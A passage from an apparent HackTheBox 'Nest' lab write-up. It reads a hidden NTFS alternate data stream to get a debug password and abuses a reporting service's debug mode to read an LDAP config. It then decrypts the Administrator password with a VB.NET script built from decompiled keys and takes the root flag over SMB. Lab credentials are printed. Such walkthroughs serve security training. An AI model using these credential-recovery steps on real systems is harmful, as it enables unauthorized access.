<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">\C.Smith\HQK Reporting</span><br><span class="line">  .                                   D        <span class="number">0</span>  Thu Aug  <span class="number">8</span> <span class="number">19</span>:<span class="number">06</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Thu Aug  <span class="number">8</span> <span class="number">19</span>:<span class="number">06</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  AD Integration Module               D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">42</span> <span class="number">2019</span></span><br><span class="line">  Debug Mode Password.txt             A        <span class="number">0</span>  Thu Aug  <span class="number">8</span> <span class="number">19</span>:<span class="number">08</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  HQK_Config_Backup.xml               A      <span class="number">249</span>  Thu Aug  <span class="number">8</span> <span class="number">19</span>:<span class="number">09</span>:<span class="number">05</span> <span class="number">2019</span></span><br><span class="line"></span><br><span class="line">\C.Smith\HQK Reporting\AD Integration Module</span><br><span class="line">  .                                   D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">42</span> <span class="number">2019</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">42</span> <span class="number">2019</span></span><br><span class="line">  HqkLdap.exe                         A    <span class="number">17408</span>  Wed Aug  <span class="number">7</span> <span class="number">19</span>:<span class="number">41</span>:<span class="number">16</span> <span class="number">2019</span></span><br></pre></td></tr></table></figure>

<p>I initially came across the <code>Debug Mode Password.txt</code> file and thought this could be used to authenticate to the <code>DEBUG</code> mode of the <strong><code>HQK Reporting Service v1.2</code></strong> service running on port <code>4386</code> we see this on our <code>nmap</code> scan. The file appeared to have 0 bytes. I spent some time searching around further and couldn‚Äôt find any other files of interest. After wasting some time on futile approaches, I eventually realized that the file could potentially have had alternate streams on an NTFS file system. I enumerated the streams and retrieved the Password stream of the file :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">smb: \C.Smith\HQK Reporting\&gt; more DEBUGM~1.TXT:Password:<span class="variable">$DATA</span></span><br><span class="line">getting file \C.Smith\HQK Reporting\DEBUGM~1.TXT:Password:<span class="variable">$DATA</span> of size 15 as /tmp/smbmore.mFLHg4 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span><br><span class="line"></span><br><span class="line">WBQ201953D8w</span><br><span class="line">/tmp/smbmore.mFLHg4</span><br><span class="line"></span><br><span class="line">smb: \C.Smith\&gt;</span><br></pre></td></tr></table></figure>

<p>if I run <code>allinfo</code> on it, I can see something else:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">smb: \C.Smith\HQK Reporting\&gt; allinfo <span class="string">"Debug Mode Password.txt"</span></span><br><span class="line">altname: DEBUGM~1.TXT</span><br><span class="line">create_time:    Thu Aug  8 07:06:12 PM 2019 EDT</span><br><span class="line">access_time:    Thu Aug  8 07:06:12 PM 2019 EDT</span><br><span class="line">write_time:     Thu Aug  8 07:08:17 PM 2019 EDT</span><br><span class="line">change_time:    Thu Aug  8 07:08:17 PM 2019 EDT</span><br><span class="line">attributes: A (20)</span><br><span class="line">stream: [::<span class="variable">$DATA</span>], 0 bytes</span><br><span class="line">stream: [:Password:<span class="variable">$DATA</span>], 15 bytes</span><br><span class="line"></span><br><span class="line">‚ùØ cat Debug\ Mode\ Password.txt:Password</span><br><span class="line">WBQ201953D8w</span><br></pre></td></tr></table></figure>

<p>So this really interesting it shows <code>password debug : WBQ201953D8w</code> this will be something useful later :</p>
<h3 id="Enumeration-with-telnet"><a href="#Enumeration-with-telnet" class="headerlink" title="Enumeration with telnet"></a>Enumeration with telnet</h3><p>I‚Äôll connect again to <code>HQK</code> with <code>telnet</code> in port <code>4386</code> and start digging. We can then use the <code>password debug</code> to gain the ability to run the <code>SHOWQUERY</code> command on the HQK Reporting Service. This functionality can be used to read files. After spending some time searching around I came across the <code>Ldap.conf</code> file that is located in <code>../LDAP/</code>.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ telnet 10.10.10.178 4386</span><br><span class="line">Trying 10.10.10.178...                                                                                                                                                                     </span><br><span class="line">Connected to 10.10.10.178.                                                                                                                                                                 </span><br><span class="line">Escape character is <span class="string">'^]'</span>.                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                           </span><br><span class="line">HQK Reporting Service V1.2                                                                                                                                                                 </span><br><span class="line">                                                                                                                                                                                           </span><br><span class="line">&gt;<span class="built_in">help</span>                                                                                                                                                                                      </span><br><span class="line">                                                                                                                                                                                           </span><br><span class="line">This service allows users to run queries against databases using the legacy HQK format                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                </span><br><span class="line">--- AVAILABLE COMMANDS ---                                                                                                                                                                                      </span><br><span class="line"></span><br><span class="line">LIST</span><br><span class="line">SETDIR &lt;Directory_Name&gt;</span><br><span class="line">RUNQUERY &lt;Query_ID&gt;</span><br><span class="line">DEBUG &lt;Password&gt;</span><br><span class="line">HELP &lt;Command&gt;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&gt;DEBUG WBQ201953D8w</span><br><span class="line"></span><br><span class="line">Debug mode enabled. Use the HELP <span class="built_in">command</span> to view additional commands that are now available</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Debug mode enabled. Use the HELP <span class="built_in">command</span> to view additional commands that are now available</span><br><span class="line">&gt;<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">This service allows users to run queries against databases using the legacy HQK format</span><br><span class="line"></span><br><span class="line">--- AVAILABLE COMMANDS ---</span><br><span class="line"></span><br><span class="line">LIST</span><br><span class="line">SETDIR &lt;Directory_Name&gt;</span><br><span class="line">RUNQUERY &lt;Query_ID&gt;</span><br><span class="line">DEBUG &lt;Password&gt;</span><br><span class="line">HELP &lt;Command&gt;</span><br><span class="line">SERVICE</span><br><span class="line">SESSION</span><br><span class="line">SHOWQUERY &lt;Query_ID&gt;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>I set the <code>dir</code> to <code>HQK</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">&gt;setdir ..</span><br><span class="line"></span><br><span class="line">Current directory <span class="built_in">set</span> to HQK</span><br><span class="line">&gt;list</span><br><span class="line"></span><br><span class="line">Use the query ID numbers below with the RUNQUERY <span class="built_in">command</span> and the directory names with the SETDIR <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"> QUERY FILES IN CURRENT DIRECTORY</span><br><span class="line"></span><br><span class="line">[DIR]  ALL QUERIES</span><br><span class="line">[DIR]  LDAP</span><br><span class="line">[DIR]  Logs</span><br><span class="line">[1]   HqkSvc.exe</span><br><span class="line">[2]   HqkSvc.InstallState</span><br><span class="line">[3]   HQK_Config.xml</span><br><span class="line"></span><br><span class="line">Current Directory: HQK</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Current Directory: HQK</span><br><span class="line">&gt;setdir LDAP</span><br><span class="line"></span><br><span class="line">Current directory <span class="built_in">set</span> to LDAP</span><br><span class="line">&gt;list</span><br><span class="line"></span><br><span class="line">Use the query ID numbers below with the RUNQUERY <span class="built_in">command</span> and the directory names with the SETDIR <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"> QUERY FILES IN CURRENT DIRECTORY</span><br><span class="line"></span><br><span class="line">[1]   HqkLdap.exe</span><br><span class="line">[2]   Ldap.conf</span><br><span class="line"></span><br><span class="line">Current Directory: LDAP</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>I try to show the <code>Ldap.conf</code> and it give us administrator credentials but the password looks like encrypted again .</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">Use the query ID numbers below with the RUNQUERY <span class="built_in">command</span> and the directory names with the SETDIR <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"> QUERY FILES IN CURRENT DIRECTORY</span><br><span class="line"></span><br><span class="line">[1]   HqkLdap.exe</span><br><span class="line">[2]   Ldap.conf</span><br><span class="line"></span><br><span class="line">Current Directory: LDAP</span><br><span class="line">&gt;showquery 2</span><br><span class="line"></span><br><span class="line">Domain=nest.local</span><br><span class="line">Port=389</span><br><span class="line">BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=<span class="built_in">local</span></span><br><span class="line">User=Administrator</span><br><span class="line">Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Analyzing-the-HqkLdap-exe"><a href="#Analyzing-the-HqkLdap-exe" class="headerlink" title="Analyzing the HqkLdap.exe"></a>Analyzing the HqkLdap.exe</h3><p>I downloaded the <code>HqkLdap.exe</code> and analyze it using <a href="https://www.jetbrains.com/decompiler/" target="_blank" rel="noopener">JetBrains - dotPeek</a> it is a free <code>NET Decompiler and Assembly</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">smb: \C.Smith\HQK Reporting\AD Integration Module\&gt; mget HqkLdap.exe</span><br><span class="line">Get file HqkLdap.exe? y</span><br><span class="line">getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HqkLdap.exe (7.5 KiloBytes/sec) (average 7.5 KiloBytes/sec)</span><br><span class="line">smb: \C.Smith\HQK Reporting\AD Integration Module\&gt;</span><br></pre></td></tr></table></figure>

<p>Looking at <code>CR Module</code> binary :</p>
<p><img src="/img/nest/CR-Binary.png" alt="HackTheBox-Nest" title="CR Binary"></p>
<p>This contains the Arguments that we have to pass in the same script from which we <code>Decrypted</code> the user <code>hash</code> because the hash that we found in <code>LDAP.conf</code> is encrypted using another method which we got in <code>CR module(part)</code> and the arguments that we will pass in the decrypt function and compile it.</p>
<h3 id="Debugging-the-HqkLdap-exe"><a href="#Debugging-the-HqkLdap-exe" class="headerlink" title="Debugging the HqkLdap.exe"></a>Debugging the HqkLdap.exe</h3><p>Did you rember the <code>vb script</code> that will decrypt the encryped password ? I use it again to decrypt also the admin password hash . I replace only this line :</p>
<p>from</p>
<p><strong>Decrypt(‚ÄúHASH‚Äù, ‚ÄúN3st22‚Äù, ‚Äú88552299‚Äù, 2, ‚Äú464R5DFA5DL6LE28‚Äù, 256)</strong><br><code>&quot;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&quot;, &quot;N3st22&quot;, &quot;88552299&quot;, 2, &quot;464R5DFA5DL6LE28&quot;, 256</code></p>
<p>to :</p>
<p><strong>Decrypt(‚ÄúHASH‚Äù, ‚Äú667912‚Äù, ‚Äú1313Rf99‚Äù, 3, ‚Äú1L1SA61493DRV53Z‚Äù, 256)</strong><br><code>&quot;yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=&quot;, &quot;667912&quot;, &quot;1313Rf99&quot;, 3, &quot;1L1SA61493DRV53Z&quot;, 256</code></p>
<p>This is the final script</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># vb.net</span></span><br><span class="line"></span><br><span class="line">Imports System.Text</span><br><span class="line">Imports System</span><br><span class="line">Imports System.Security.Cryptography</span><br><span class="line">				</span><br><span class="line">Public Module Module1</span><br><span class="line">		<span class="function">Public Sub <span class="title">Main</span><span class="params">()</span></span></span><br><span class="line">		Console.WriteLine(Decrypt("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=", "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256))</span><br><span class="line">		End Sub</span><br><span class="line">	 <span class="function">Public Function <span class="title">Decrypt</span><span class="params">(ByVal cipherText As <span class="keyword">String</span>, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                   ByVal passPhrase As <span class="keyword">String</span>, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                   ByVal saltValue As <span class="keyword">String</span>, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                    ByVal passwordIterations As Integer, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                   ByVal initVector As <span class="keyword">String</span>, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                   ByVal keySize As Integer)</span> _</span></span><br><span class="line"><span class="function">                           As <span class="keyword">String</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        Dim initVectorBytes As <span class="title">Byte</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        initVectorBytes </span>= Encoding.ASCII.GetBytes(initVector)</span><br><span class="line"></span><br><span class="line">        <span class="function">Dim saltValueBytes As <span class="title">Byte</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        saltValueBytes </span>= Encoding.ASCII.GetBytes(saltValue)</span><br><span class="line"></span><br><span class="line">        <span class="function">Dim cipherTextBytes As <span class="title">Byte</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        cipherTextBytes </span>= Convert.FromBase64String(cipherText)</span><br><span class="line"></span><br><span class="line">        <span class="function">Dim password As New <span class="title">Rfc2898DeriveBytes</span><span class="params">(passPhrase, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                           saltValueBytes, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                           passwordIterations)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        Dim keyBytes As <span class="title">Byte</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        keyBytes </span>= password.GetBytes(CInt(keySize / <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">        Dim symmetricKey As New AesCryptoServiceProvider</span><br><span class="line">        symmetricKey.Mode = CipherMode.CBC</span><br><span class="line"></span><br><span class="line">        Dim decryptor As ICryptoTransform</span><br><span class="line">        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)</span><br><span class="line"></span><br><span class="line">        Dim memoryStream As IO.MemoryStream</span><br><span class="line">        memoryStream = New IO.MemoryStream(cipherTextBytes)</span><br><span class="line"></span><br><span class="line">        Dim cryptoStream As CryptoStream</span><br><span class="line">        cryptoStream = New CryptoStream(memoryStream, _</span><br><span class="line">                                        decryptor, _</span><br><span class="line">                                        CryptoStreamMode.Read)</span><br><span class="line"></span><br><span class="line">        Dim plainTextBytes As Byte()</span><br><span class="line">        ReDim plainTextBytes(cipherTextBytes.Length)</span><br><span class="line"></span><br><span class="line">        Dim decryptedByteCount As Integer</span><br><span class="line">        decryptedByteCount = cryptoStream.Read(plainTextBytes, _</span><br><span class="line">                                               <span class="number">0</span>, _</span><br><span class="line">                                               plainTextBytes.Length)</span><br><span class="line"></span><br><span class="line">        memoryStream.Close()</span><br><span class="line">        cryptoStream.Close()</span><br><span class="line"></span><br><span class="line">        Dim plainText As <span class="keyword">String</span></span><br><span class="line">        plainText = Encoding.ASCII.GetString(plainTextBytes, _</span><br><span class="line">                                            <span class="number">0</span>, _</span><br><span class="line">                                            decryptedByteCount)</span><br><span class="line"></span><br><span class="line">        Return plainText</span><br><span class="line">    End Function</span><br><span class="line">End Module</span><br></pre></td></tr></table></figure>

<p>Copy and execute this in <a href="https://dotnetfiddle.net/" target="_blank" rel="noopener">dotnetfiddle</a> and we will get the password :</p>
<p><img src="/img/nest/admin-decrypted-password.png" alt="HackTheBox-Nest" title="Administrator password"></p>
<p>Administrator password :    <code>XtH4nkS4Pl4y1nGX</code></p>
<h3 id="Grabbing-the-root-txt"><a href="#Grabbing-the-root-txt" class="headerlink" title="Grabbing the root.txt"></a>Grabbing the root.txt</h3><p>Sadly we can‚Äôt use this in <code>Evil-WinRM</code> we don‚Äôt have proper shell to get the <code>root.txt</code> just only <code>smbclient</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbclient  \\\\10.10.10.178\\c$ -U Administrator</span><br><span class="line">Enter WORKGROUP\Administrator<span class="string">'s password: </span></span><br><span class="line"><span class="string">Try "help" to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; recurse on</span></span><br><span class="line"><span class="string">smb: \&gt; cd Users\Administrator\Desktop\</span></span><br><span class="line"><span class="string">smb: \Users\Administrator\Desktop\&gt; ls</span></span><br><span class="line"><span class="string">  .                                  DR        0  Sun Jan 26 15:20:50 2020</span></span><br><span class="line"><span class="string">  ..                                 DR        0  Sun Jan 26 15:20:50 2020</span></span><br><span class="line"><span class="string">  desktop.ini                       AHS      282  Sun Jan 26 06:02:44 2020</span></span><br><span class="line"><span class="string">  root.txt                            A       32  Tue Aug  6 06:27:26 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                10485247 blocks of size 4096. 6545433 blocks available</span></span><br><span class="line"><span class="string">smb: \Users\Administrator\Desktop\&gt; get root.txt</span></span><br><span class="line"><span class="string">getting file \Users\Administrator\Desktop\root.txt of size 32 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span></span><br><span class="line"><span class="string">smb: \Users\Administrator\Desktop\&gt;</span></span><br></pre></td></tr></table></figure>

<p>download the <code>root.txt</code> and finally !</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ ls</span><br><span class="line"><span class="string">'Debug Mode Password.txt'</span>   HqkLdap.exe   IT  <span class="string">'Maintenance Alerts.txt'</span>   nmap-Nest   Production   Reports   root.txt   Shared   user.txt  <span class="string">'Welcome Email.txt'</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ cut -c 4-12 root.txt</span><br><span class="line">c2eb084bc</span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<hr>
<p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p>
<p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p>
<hr>
<p>Referrences:</p>
<p><a href="https://www.jetbrains.com/decompiler/" target="_blank" rel="noopener">dotPeek - .NET Decompiler and Assembly </a></p>
<p><a href="https://dotnetfiddle.net/" target="_blank" rel="noopener">dotnetfiddle</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/projects/">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-results"><span class="toc-number">3.2.</span> <span class="toc-text">Nmap results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerating-SMB-Shares"><span class="toc-number">4.1.</span> <span class="toc-text">Enumerating SMB Shares</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerate-TempUser"><span class="toc-number">5.1.</span> <span class="toc-text">Enumerate TempUser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Decrypting-the-Password"><span class="toc-number">5.2.</span> <span class="toc-text">Decrypting the Password</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerate-C-Smith"><span class="toc-number">6.1.</span> <span class="toc-text">Enumerate C.Smith</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Grab-the-user-flag"><span class="toc-number">6.2.</span> <span class="toc-text">Grab the user flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration-with-telnet"><span class="toc-number">7.1.</span> <span class="toc-text">Enumeration with telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyzing-the-HqkLdap-exe"><span class="toc-number">7.2.</span> <span class="toc-text">Analyzing the HqkLdap.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debugging-the-HqkLdap-exe"><span class="toc-number">7.3.</span> <span class="toc-text">Debugging the HqkLdap.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Grabbing-the-root-txt"><span class="toc-number">7.4.</span> <span class="toc-text">Grabbing the root.txt</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&text=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&title=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&is_video=false&description=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox - Nest üïäÔ∏èüê£&body=Check out this article: https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&title=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&title=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&title=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&title=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&name=HackTheBox - Nest üïäÔ∏èüê£&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&t=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    InfoSec &#64; medz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/projects/">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
